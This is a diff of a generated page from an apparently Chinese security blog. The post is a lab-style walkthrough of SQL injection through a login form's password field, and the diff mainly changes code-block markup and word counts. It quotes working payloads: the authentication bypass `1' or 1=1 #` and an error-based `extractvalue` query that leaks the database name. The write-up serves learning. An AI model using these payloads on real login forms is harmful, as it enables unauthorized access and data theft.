@@ -477,7 +477,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    336
+                    343
                 </div>
                 
 
@@ -494,6 +494,9 @@
         <hr class="clearfix">
 
         
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
 
         
 
@@ -509,16 +512,16 @@
 <p>源码当中还遇到<code>update</code>进行了密码更新，以至于<code>passwd</code>字段可以进行构造payload：</p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205140047399.png" alt="image-20220205140047399"></p>
 <h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>而执行以下语句时报错：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin  &amp;passwd=1&#x27;</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin  &amp;passwd&#x3D;1&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205140447561.png" alt="image-20220205140447561"></p>
 <p>探测注入点：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin  &amp;passwd=1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin  &amp;passwd&#x3D;1&#39; or 1&#x3D;1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>登录成功。</p>
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205140542450.png" alt="image-20220205140542450"></p>
 <h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>在passwd处构造payload进行报错注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin  &amp;passwd=1&#x27; or extractvalue(1,concat(0x7e,(select database()),0x7e)) #</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin  &amp;passwd&#x3D;1&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/image-20220205140826696.png" alt="image-20220205140826696"></p>
 <p>其他payload类似。</p>
@@ -975,7 +978,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">31.4k</span>
+                        class="white-color">32.1k</span>
             
             
             
